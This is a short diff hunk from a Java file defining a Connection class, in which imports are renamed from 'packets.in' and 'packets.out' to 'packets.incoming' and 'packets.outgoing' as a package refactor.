@@ -21,9 +21,9 @@ import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.common.Version;
 import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.in.AbstractIncomingPacket;
-import com.redpois0n.packets.in.PacketBuilder;
-import com.redpois0n.packets.out.Header;
+import com.redpois0n.packets.incoming.AbstractIncomingPacket;
+import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Header;
 import com.sun.management.OperatingSystemMXBean;
 
 public class Connection implements Runnable {
